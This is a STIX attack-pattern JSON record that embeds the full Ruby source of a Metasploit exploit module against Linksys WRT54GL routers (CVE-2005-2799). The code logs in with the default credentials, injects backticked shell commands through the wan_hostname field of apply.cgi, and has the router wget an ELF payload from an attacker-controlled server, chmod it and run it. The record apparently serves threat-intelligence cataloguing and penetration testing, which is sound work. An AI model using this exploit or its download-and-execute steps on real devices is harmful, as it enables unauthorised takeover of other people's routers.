{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0259d56b-4225-4998-9aa5-1b170a2bd43d",
    "created": "2024-08-14T17:03:36.818985Z",
    "modified": "2024-08-14T17:03:36.81899Z",
    "name": "Linksys WRT54GL apply.cgi Command Execution",
    "description": " Some Linksys Routers are vulnerable to an authenticated OS command injection in the Web Interface. Default credentials are admin/admin or admin/password. Since it is a blind os command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. The user must be prudent when using this module since it modifies the router configuration while exploitation, even when it tries to restore previous values. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linksys_wrt54gl_apply_exec.rb",
            "external_id": "linksys_wrt54gl_apply_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2799"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-001"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t=> 'Linksys WRT54GL apply.cgi Command Execution',\n      'Description' => %q{\n          Some Linksys Routers are vulnerable to an authenticated OS command injection in\n        the Web Interface. Default credentials are admin/admin or admin/password. Since it\n        is a blind os command injection vulnerability, there is no output for the executed\n        command when using the cmd generic payload. A ping command against a controlled\n        system could be used for testing purposes. The user must be prudent when using this\n        module since it modifies the router configuration while exploitation, even when it\n        tries to restore previous values.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2005-2799' ],\n          [ 'OSVDB', '89912' ],\n          [ 'BID', '57459' ],\n          [ 'EDB', '24202' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-001' ]\n        ],\n      'DisclosureDate' => '2013-01-18',\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix },\n      'Payload'\t=>\n        {\n          'DisableNops' => true\n        },\n      'Targets'\t=>\n        [\n          [ 'CMD',\n            {\n            'Arch' => ARCH_CMD,\n            'Platform' => 'unix'\n            }\n          ],\n          [ 'Linux mipsel Payload',\n            {\n            'Arch' => ARCH_MIPSLE,\n            'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DefaultTarget'  => 1\n      ))\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'The username to authenticate as', 'admin' ]),\n        OptString.new('HttpPassword', [ true, 'The password for the specified username', 'admin' ]),\n        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),\n        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60]),\n        OptBool.new('RESTORE_CONF', [ true, 'Should we try to restore the original configuration', true ])\n      ])\n  end\n\n\n  def get_config(config, pattern)\n    if config =~ /#{pattern}/\n      return $1\n    end\n    return \"\"\n  end\n\n  def grab_config(user,pass)\n    print_status(\"#{rhost}:#{rport} - Trying to download the original configuration\")\n    begin\n      res = send_request_cgi({\n        'uri'     => '/index.asp',\n        'method'  => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n      if res.nil? or res.code == 404\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n      if [200, 301, 302].include?(res.code)\n        if res.body =~ /lan_ipaddr_0/\n          print_good(\"#{rhost}:#{rport} - Successful downloaded the configuration\")\n        else\n          fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - Download of the original configuration not possible\")\n        end\n      else\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Failed to connect to the web server\")\n    end\n\n    #now_proto and wan_proto should be the same and it should be dhcp! Nothing else tested!\n    @now_proto_orig = get_config(res.body, \"<input\\ type=hidden\\ name=now_proto\\ value=\\'(.*)\\'>\")\n    if @now_proto_orig !~ /dhcp/\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Configuration not recognized, aborting to avoid breaking the device\")\n    end\n    @wan_proto_orig = get_config(res.body, \"var\\ wan_proto\\ =\\ \\'(.*)\\'\\;\")\n    if @wan_proto_orig !~ /dhcp/\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Configuration not recognized, aborting to avoid breaking the device\")\n    end\n    @lan_proto_orig = get_config(res.body, \"<input\\ type=\\\"radio\\\"\\ name=\\\"lan_proto\\\"\\ value=\\\"(.*)\\\"\\ checked\\ onClick=\\\"SelDHCP\")\n    @daylight_time_orig = get_config(res.body, \"<input\\ type=hidden\\ name=daylight_time\\ value=(.*)>\")\n    @lan_ipaddr_orig = get_config(res.body, \"<input\\ type=hidden\\ name=\\\"lan_ipaddr\\\"\\ value=(.*)>\")\n    @wait_time_orig = get_config(res.body, \"<input\\ type=hidden\\ name=\\\"wait_time\\\"\\ value=(.*)>\")\n    @need_reboot_orig = get_config(res.body, \"<input\\ type=hidden\\ name=\\\"need_reboot\\\"\\ value=(.*)>\")\n    @lan_ipaddr_0_orig = get_config(res.body, \"onBlur\\=valid_range\\\\(this\\,1\\,223\\,\\\"IP\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"lan_ipaddr_0\\\"\\>\")\n    @lan_ipaddr_1_orig = get_config(res.body, \"\\<INPUT\\ class=num\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"IP\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"lan_ipaddr_1\\\">\")\n    @lan_ipaddr_2_orig = get_config(res.body, \"\\<INPUT\\ class=num maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"IP\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"lan_ipaddr_2\\\">\")\n    @lan_ipaddr_3_orig = get_config(res.body, \"<INPUT class=num maxLength=3\\ onBlur=\\\"valid_range\\\\(this,1,254,'IP'\\\\)\\;Sel_SubMask\\\\(this.form.lan_netmask,this.form\\\\);\\\"\\ size=3\" <<\n      \"\\ value='(.*)'\\ name=\\\"lan_ipaddr_3\\\"><\\/TD>\")\n    @router_name_orig = get_config(res.body, \"name=\\\"router_name\\\"\\ size=\\\"20\\\"\\ value=\\'(.*)\\'\\ onBlur=valid_name\\\\(this\\,\\\"Router%20Name\\\"\\\\)><\\/FONT><\\/TD>\")\n    @wan_domain_orig = get_config(res.body, \"name=\\\"wan_domain\\\"\\ size=\\\"20\\\"\\ value=\\'(.*)\\'\\ onBlur=valid_name\\\\(this\\,\\\"Domain%20name\\\"\\,SPACE_NO\\\\)><\\/FONT><\\/TD>\")\n    @wan_hostname_orig = get_config(res.body, \"<INPUT\\ maxLength=39\\ name=\\\"wan_hostname\\\"\\ size=\\\"20\\\"\\ value=\\'(.*)\\'\\ onBlur=valid_name\\\\(this\\,\\\"Host%20Name\\\"\\\\)><\\/FONT><\\/TD>\")\n    @wan_mtu_orig = get_config(res.body, \"<INPUT\\ class=num\\ maxLength=4\\ onBlur=valid_mtu\\\\(this\\\\)\\ size=5\\ value='(.*)'\\ name=\\\"wan_mtu\\\"><\\/TD>\")\n    if @wan_mtu_orig.to_i > 1500\n      @mtu_enable = \"0\"\n    end\n    @ui_language_orig = get_config(res.body, \"<SCRIPT\\ language=\\\"Javascript\\\"\\ type=\\\"text\\/javascript\\\" src=\\\"(.*)_lang_pack\\/capsec.js\\\"><\\/SCRIPT>\")\n    @dhcp_lease_orig = get_config(res.body, \"<INPUT\\ maxLength=4\\ onBlur=valid_range\\\\(this\\,0\\,9999\\,\\\"DHCP%20Lease%20Time\\\"\\\\)\\ size=4\\ value=\\'(.*)\\'\\ name=\\\"dhcp_lease\\\"\\ class=num\")\n    @dhcp_num_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,1\\,253\\,\\\"Number%20of%20DHCP%20users\\\"\\\\)\\;Sel_SubMask_onblur\\\\(this.form.lan_netmask\\,this.form\\\\)\" <<\n      \"\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"dhcp_num\\\"\\ class=num><\\/TD>\")\n    @dhcp_start_orig = get_config(res.body, \"Sel_SubMask_onblur\\\\(this.form.lan_netmask\\,this.form\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"dhcp_start\\\"\\ class=num\\ \" <<\n      \"onChange=\\\"valid_dhcpd_start_ip\\\\(this.form\\,\\ this\\\\)\\\">\")\n    @netmask_orig = get_config(res.body, \"value=.*\\ selected\\>255\\.255\\.255\\.(.*)\\<\\/OPTION\\>\")\n    @wan_dns_orig = get_config(res.body, \"<input\\ type=hidden\\ name=wan_dns\\ value=(.*)><INPUT\\ maxLength=3\")\n    @wan_dns0_0_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,223\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns0_0\\\"\\ class=num\\>\")\n    @wan_dns0_1_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\' name=\\\"wan_dns0_1\\\"\\ class=num\\>\")\n    @wan_dns0_2_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns0_2\\\"\\ class=num\\>\")\n    @wan_dns0_3_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,254\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns0_3\\\"\\ class=num\\>\")\n    @wan_dns1_0_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,223\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns1_0\\\"\\ class=num\\>\")\n    @wan_dns1_1_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\' name=\\\"wan_dns1_1\\\"\\ class=num\\>\")\n    @wan_dns1_2_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns1_2\\\"\\ class=num\\>\")\n    @wan_dns1_3_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,254\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns1_3\\\"\\ class=num\\>\")\n    @wan_dns2_0_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,223\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns2_0\\\"\\ class=num\\>\")\n    @wan_dns2_1_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\' name=\\\"wan_dns2_1\\\"\\ class=num\\>\")\n    @wan_dns2_2_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns2_2\\\"\\ class=num\\>\")\n    @wan_dns2_3_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,254\\,\\\"DNS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_dns2_3\\\"\\ class=num\\>\")\n    @wan_wins_orig = get_config(res.body, \"<input\\ type=hidden\\ name=wan_wins\\ value=(.*)><INPUT\\ maxLength=3\")\n    @wan_wins_0_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,223\\,\\\"WINS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_wins_0\\\"\\ class=num>\")\n    @wan_wins_1_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"WINS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_wins_1\\\"\\ class=num>\")\n    @wan_wins_2_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,255\\,\\\"WINS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_wins_2\\\"\\ class=num>\")\n    @wan_wins_3_orig = get_config(res.body, \"<INPUT\\ maxLength=3\\ onBlur=valid_range\\\\(this\\,0\\,254\\,\\\"WINS\\\"\\\\)\\ size=3\\ value=\\'(.*)\\'\\ name=\\\"wan_wins_3\\\"\\ class=num>\")\n  end\n\n  def restore_conf(user,pass,uri)\n    # we have used most parts of the original configuration\n    # just need to restore wan_hostname\n    cmd = @wan_hostname_orig.to_s\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to reload original configuration\")\n\n    res = request(cmd,user,pass,uri)\n\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to reload original configuration\")\n    end\n\n    #the device needs around 10 seconds to apply our current configuration\n    print_status(\"#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration\")\n    select(nil, nil, nil, @timeout)\n  end\n\n  def request(cmd,user,pass,uri)\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'POST',\n        'authorization' => basic_auth(user,pass),\n        'encode_params' => false,\n        'vars_post' => {\n          'submit_button' => \"index\",\n          'change_action' => \"1\",\n          'submit_type' => \"1\",\n          'action' => \"Apply\",\n          'now_proto' => @now_proto_orig.to_s,\n          'daylight_time' => @daylight_time_orig.to_s,\n          'lan_ipaddr' => @lan_ipaddr_orig.to_s,\n          'wait_time' => @wait_time_orig.to_s,\n          'need_reboot' => @need_reboot_orig.to_s,\n          'ui_language' => @ui_language_orig,\n          'wan_proto' => @wan_proto_orig.to_s,\n          'router_name' => @router_name_orig.to_s,\n          'wan_hostname' => cmd,\n          'wan_domain' => @wan_domain_orig.to_s,\n          'mtu_enable' => @mtu_enable.to_s,\n          'wan_mtu' => @wan_mtu_orig.to_s,\n          'lan_ipaddr_0' => @lan_ipaddr_0_orig.to_s,\n          'lan_ipaddr_1' => @lan_ipaddr_1_orig.to_s,\n          'lan_ipaddr_2' => @lan_ipaddr_2_orig.to_s,\n          'lan_ipaddr_3' => @lan_ipaddr_3_orig.to_s,\n          'lan_netmask' => \"255.255.255.#{@netmask_orig}\",\n          'lan_proto' => @lan_proto_orig.to_s,\n          'dhcp_check' => \"1\",\n          'dhcp_start' => @dhcp_start_orig.to_s,\n          'dhcp_num' => @dhcp_num_orig.to_s,\n          'dhcp_lease' => @dhcp_lease_orig.to_s,\n          'wan_dns' => @wan_dns_orig.to_s,\n          'wan_dns0_0' => @wan_dns0_0_orig.to_s,\n          'wan_dns0_1' => @wan_dns0_1_orig.to_s,\n          'wan_dns0_2' => @wan_dns0_2_orig.to_s,\n          'wan_dns0_3' => @wan_dns0_3_orig.to_s,\n          'wan_dns1_0' => @wan_dns1_0_orig.to_s,\n          'wan_dns1_1' => @wan_dns1_1_orig.to_s,\n          'wan_dns1_2' => @wan_dns1_2_orig.to_s,\n          'wan_dns1_3' => @wan_dns1_3_orig.to_s,\n          'wan_dns2_0' => @wan_dns2_0_orig.to_s,\n          'wan_dns2_1' => @wan_dns2_1_orig.to_s,\n          'wan_dns2_2' => @wan_dns2_2_orig.to_s,\n          'wan_dns2_3' => @wan_dns2_3_orig.to_s,\n          'wan_wins' => @wan_wins_orig.to_s,\n          'wan_wins_0' => @wan_wins_0_orig.to_s,\n          'wan_wins_1' => @wan_wins_1_orig.to_s,\n          'wan_wins_2' => @wan_wins_2_orig.to_s,\n          'wan_wins_3' => @wan_wins_3_orig.to_s,\n          'time_zone' => \"-08+1+1\",\t\t#default is ok\n          '_daylight_time' => '1'\t\t\t#default is ok\n          }\n        })\n      return res\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost} - Failed to connect to the web server\")\n      return nil\n    end\n\n  end\n\n  def exploit\n    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))\n    uri = '/apply.cgi'\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword']\n    rhost = datastore['RHOST']\n    rport = datastore['RPORT']\n    restore = datastore['RESTORE_CONF']\n    @timeout = 10\n\n    #\n    # testing Login\n    #\n    print_status(\"#{rhost}:#{rport} - Trying to login with #{user} / #{pass}\")\n    begin\n      res = send_request_cgi({\n        'uri'     => uri,\n        'method'  => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n      if res.nil? or res.code == 404\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n      if [200, 301, 302].include?(res.code)\n        print_good(\"#{rhost}:#{rport} - Successful login #{user}/#{pass}\")\n      else\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Failed to connect to the web server\")\n    end\n\n\n    grab_config(user,pass)\n\n    if target.name =~ /CMD/\n      if not (datastore['CMD'])\n        fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - Only the cmd/generic payload is compatible\")\n      end\n      cmd = payload.encoded\n      cmd = \"`#{cmd}`\"\n      res = request(cmd,user,pass,uri)\n      if (!res)\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n      else\n        print_status(\"#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\")\n      end\n      print_status(\"#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration\")\n      select(nil, nil, nil, @timeout)\n      restore_conf(user,pass,uri) if restore\n      return\n    end\n\n    #thx to Juan for his awesome work on the mipsel elf support\n    @pl = generate_payload_exe\n    @elf_sent = false\n\n    #\n    # start our server\n    #\n    resource_uri = '/' + downfile\n\n    if (datastore['DOWNHOST'])\n      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri\n    else\n      #do not use SSL\n      if datastore['SSL']\n        ssl_restore = true\n        datastore['SSL'] = false\n      end\n\n      #we use SRVHOST as download IP for the coming wget command.\n      #SRVHOST needs a real IP address of our download host\n      if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n        srv_host = Rex::Socket.source_address(rhost)\n      else\n        srv_host = datastore['SRVHOST']\n      end\n\n      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri\n      print_status(\"#{rhost}:#{rport} - Starting up our web service on #{service_url} ...\")\n      start_service({'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }})\n\n      datastore['SSL'] = true if ssl_restore\n    end\n\n    #\n    # download payload\n    #\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to download #{service_url}\")\n    #this filename is used to store the payload on the device\n    filename = rand_text_alpha_lower(8)\n\n    #not working if we send all command together -> lets take three requests\n    cmd = \"/usr/bin/wget #{service_url} -O /tmp/#{filename}\"\n    cmd = \"`#{cmd}`\"\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n    # wait for payload download\n    if (datastore['DOWNHOST'])\n      #waiting some time so we could be sure that the device got the payload from our third party server\n      print_status(\"#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the Linksys device to download the payload\")\n      select(nil, nil, nil, datastore['HTTP_DELAY'])\n    else\n      wait_linux_payload\n    end\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n\n    #\n    # chmod\n    #\n    cmd = \"chmod 777 /tmp/#{filename}\"\n    cmd = \"`#{cmd}`\"\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to chmod #{downfile}\")\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n    print_status(\"#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration\")\n    select(nil, nil, nil, @timeout)\n\n    #\n    # execute\n    #\n    cmd = \"/tmp/#{filename}\"\n    cmd = \"`#{cmd}`\"\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to execute #{downfile}\")\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n    print_status(\"#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration\")\n    select(nil, nil, nil, @timeout)\n\n    #\n    #reload original configuration\n    #\n    if restore\n      restore_conf(user,pass,uri)\n    end\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    #print_status(\"on_request_uri called: #{request.inspect}\")\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status(\"#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...\")\n\n    waited = 0\n    while (not @elf_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-18",
    "x_mitre_platforms": [
        "linux"
    ]
}